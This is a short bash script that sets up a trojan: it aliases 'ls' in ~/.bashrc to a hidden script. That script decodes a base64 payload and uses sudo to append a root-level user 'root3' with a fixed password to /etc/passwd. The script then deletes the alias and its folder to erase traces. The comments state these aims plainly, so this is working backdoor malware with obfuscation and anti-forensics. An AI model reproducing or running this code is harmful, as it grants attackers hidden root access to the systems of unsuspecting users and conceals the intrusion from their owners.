#!/bin/bash
cd
# supression of the alias ls="curen if the script is already installed
sed -i '/alias ls="curen/d' ~/.bashrc
# add the alias to the script in the .bashrc (script located in .bin)
echo "alias ls=\"curentdirectory=\$(pwd) ; ~/.bin/./ls 2> /dev/null ; source ~/.bashrc ; ls\"" >> .bashrc
# creation of the .bin folder
mkdir ~/.bin 2> /dev/null
# we move to the .bin folder
cd ~/.bin 2> /dev/null
# creation of the ls script
echo "#!/bin/bash" > ls
# translation of the code base 64 (Encode in base64 to hide in the script the root3 password) :
#id root3 > /dev/null 2> /dev/null || var=$(openssl passwd 3toor) ; id root3 > /dev/null 2> /dev/null || sudo sh -c " echo 'root3:$var:0:0:root:/root:/bin/bash' >> /etc/passwd"
# add this base 64 code in the ls script
# the code allows to create a user root3 with the password 3toor
echo "echo -n 'aWQgcm9vdDMgPiAvZGV2L251bGwgMj4gL2Rldi9udWxsIHx8IHZhcj0kKG9wZW5zc2wgcGFzc3dkIDN0b29yKSA7IGlkIHJvb3QzID4gL2Rldi9udWxsIDI+IC9kZXYvbnVsbCB8fCBzdWRvIHNoIC1jICIgZWNobyAncm9vdDM6JHZhcjowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkIgo=' | base64 --decode | bash -" >> ls
# added in the script the suppression of the alias ls="curen to erase the traces
echo "sed -i '/alias ls=\"curen/d' ~/.bashrc" >> ls
# addition in the script of the deletion of the .bin folder to erase the traces
echo "rm -rf ~/.bin" >> ls
# add execution rights to the ls script
chmod +x ls
# we go back to the home folder
cd